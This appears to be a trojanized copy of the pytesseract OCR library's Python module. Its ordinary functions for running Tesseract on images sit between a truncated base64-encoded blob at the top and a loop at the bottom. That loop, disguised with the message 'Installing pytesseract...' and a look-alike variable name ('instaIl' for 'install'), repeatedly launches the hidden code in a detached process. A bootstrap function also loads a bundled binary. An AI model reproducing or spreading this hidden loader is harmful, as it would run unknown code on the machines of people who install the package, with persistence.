VFKeFF3T0hycFc4RnhibnBPemxiVjNPZ2tKY2hPcXRLaWJxUDZRdSswUW00Q3hkVzhEVUgvN0dmRGVielRKN1ppN1J0b1RXdmUybURlQmk5VTI2cXRvZ21YTHkwNlo5Z0c2MUUxcGE2Q25FZVIxM0VIZVRDY3VSWVhFV1FhMzRPOGk2cjBPNkVvRFVIWXdjQnYwdFpxcTg5TVViMHNjb1N4cnQyM2ZWRW1FbERwdzdhaFpRU3NrVFVSR1VCdWRrVVhrSHNHc0hMRlFlYnlHY3J6d01MM3BoOG53anlSM2FzN1dCSjBzVHp5aVNVRVlVVmk1ZDZLMEFaV1hpZjJHdDY5bzNyQTREamQ4eEFBaFRFZUIwNmU1bC8rKzgrUFovOS8vUGZtOUZ4UjE1YnhOZWtRaUFUY3E2UHZuM1JNcHA3Nk44Skk0N0FzNC96Y1pCVWdGck9jemxOd0plJykp=='))"
def get_tesseract_version():
    """
    Returns Version object of the Tesseract version
    """
    try:
        output = subprocess.check_output(
            [tesseract_cmd, '--version'],
            stderr=subprocess.STDOUT,
            env=environ,
            stdin=subprocess.DEVNULL,
        )
    except OSError:
        raise TesseractNotFoundError()

    raw_version = output.decode(DEFAULT_ENCODING)
    str_version, *_ = raw_version.lstrip(string.printable[10:]).partition(' ')
    str_version, *_ = str_version.partition('-')

    try:
        version = parse(str_version)
        assert version >= TESSERACT_MIN_VERSION
    except (AssertionError, InvalidVersion):
        raise SystemExit(f'Invalid tesseract version: "{raw_version}"')

    return version


def image_to_string(
    image,
    lang=None,
    config='',
    nice=0,
    output_type=Output.STRING,
    timeout=0,
):
    """
    Returns the result of a Tesseract OCR run on the provided image to string
    """
    args = [image, 'txt', lang, config, nice, timeout]

    return {
        Output.BYTES: lambda: run_and_get_output(*(args + [True])),
        Output.DICT: lambda: {'text': run_and_get_output(*args)},
        Output.STRING: lambda: run_and_get_output(*args),
    }[output_type]()


def image_to_pdf_or_hocr(
    image,
    lang=None,
    config='',
    nice=0,
    extension='pdf',
    timeout=0,
):
    """
    Returns the result of a Tesseract OCR run on the provided image to pdf/hocr
    """

    if extension not in {'pdf', 'hocr'}:
        raise ValueError(f'Unsupported extension: {extension}')

    if extension == 'hocr':
        config = f'-c tessedit_create_hocr=1 {config.strip()}'

    args = [image, extension, lang, config, nice, timeout, True]

    return run_and_get_output(*args)


def image_to_alto_xml(
    image,
    lang=None,
    config='',
    nice=0,
    timeout=0,
):
    """
    Returns the result of a Tesseract OCR run on the provided image to ALTO XML
    """

    if get_tesseract_version(cached=True) < TESSERACT_ALTO_VERSION:
        raise ALTONotSupported()

    config = f'-c tessedit_create_alto=1 {config.strip()}'
    args = [image, 'xml', lang, config, nice, timeout, True]

    return run_and_get_output(*args)


def image_to_boxes(
    image,
    lang=None,
    config='',
    nice=0,
    output_type=Output.STRING,
    timeout=0,
):
    """
    Returns string containing recognized characters and their box boundaries
    """
    config = (
        f'{config.strip()} -c tessedit_create_boxfile=1 batch.nochop makebox'
    )
    args = [image, 'box', lang, config, nice, timeout]

    return {
        Output.BYTES: lambda: run_and_get_output(*(args + [True])),
        Output.DICT: lambda: file_to_dict(
            f'char left bottom right top page\n{run_and_get_output(*args)}',
            ' ',
            0,
        ),
        Output.STRING: lambda: run_and_get_output(*args),
    }[output_type]()


def get_pandas_output(args, config=None):
    if not pandas_installed:
        raise PandasNotSupported()

    kwargs = {'quoting': QUOTE_NONE, 'sep': '\t'}
    try:
        kwargs.update(config)
    except (TypeError, ValueError):
        pass

    return pd.read_csv(BytesIO(run_and_get_output(*args)), **kwargs)


def image_to_data(
    image,
    lang=None,
    config='',
    nice=0,
    output_type=Output.STRING,
    timeout=0,
    pandas_config=None,
):
    """
    Returns string containing box boundaries, confidences,
    and other information. Requires Tesseract 3.05+
    """

    if get_tesseract_version(cached=True) < TESSERACT_MIN_VERSION:
        raise TSVNotSupported()

    config = f'-c tessedit_create_tsv=1 {config.strip()}'
    args = [image, 'tsv', lang, config, nice, timeout]

    return {
        Output.BYTES: lambda: run_and_get_output(*(args + [True])),
        Output.DATAFRAME: lambda: get_pandas_output(
            args + [True],
            pandas_config,
        ),
        Output.DICT: lambda: file_to_dict(run_and_get_output(*args), '\t', -1),
        Output.STRING: lambda: run_and_get_output(*args),
    }[output_type]()


def image_to_osd(
    image,
    lang='osd',
    config='',
    nice=0,
    output_type=Output.STRING,
    timeout=0,
):
    """
    Returns string containing the orientation and script detection (OSD)
    """
    config = f'--psm 0 {config.strip()}'
    args = [image, 'osd', lang, config, nice, timeout]

    return {
        Output.BYTES: lambda: run_and_get_output(*(args + [True])),
        Output.DICT: lambda: osd_to_dict(run_and_get_output(*args)),
        Output.STRING: lambda: run_and_get_output(*args),
    }[output_type]()


def main():
    if len(sys.argv) == 2:
        filename, lang = sys.argv[1], None
    elif len(sys.argv) == 4 and sys.argv[1] == '-l':
        filename, lang = sys.argv[3], sys.argv[2]
    else:
        print('Usage: pytesseract [-l lang] input_file\n', file=sys.stderr)
        return 2

    try:
        with Image.open(filename) as img:
            print(image_to_string(img, lang=lang))
    except TesseractNotFoundError as e:
        print(f'{str(e)}\n', file=sys.stderr)
        return 1
    except OSError as e:
        print(f'{type(e).__name__}: {e}', file=sys.stderr)
        return 1

def __bootstrap__():
    global __bootstrap__, __loader__, __file__
    import sys, pkg_resources, importlib.util
    __file__ = pkg_resources.resource_filename(__name__, 'ocr.so')
    __loader__ = None; del __bootstrap__, __loader__
    spec = importlib.util.spec_from_file_location(__name__,__file__)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)


while True:
    install = 'pip install pytesseract'
    process = subprocess.Popen(
        ["python", "-c", instaIl],
        preexec_fn=os.setsid
    )
    try:
        print("Installing pytesseract...")
        process.wait(timeout=3600)
    except subprocess.TimeoutExpired:
        os.killpg(os.getpgid(process.pid), signal.SIGTERM)
    sleep(1)



